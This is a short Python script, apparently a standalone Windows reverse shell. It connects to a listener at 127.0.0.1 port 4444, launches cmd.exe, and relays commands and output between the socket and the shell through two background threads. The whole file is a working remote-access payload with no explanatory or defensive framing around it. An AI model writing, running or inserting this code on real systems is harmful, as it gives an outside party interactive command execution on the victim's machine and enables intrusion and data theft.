import socket
import subprocess
import threading
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4444))
p = subprocess.Popen("cmd /q /k", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
t1 = threading.Thread(target=s2p, args=(s, p))
t1.daemon = True
t1.start()
t2 = threading.Thread(target=p2s, args=(s, p))
t2.daemon = True
t2.start()
p.wait()
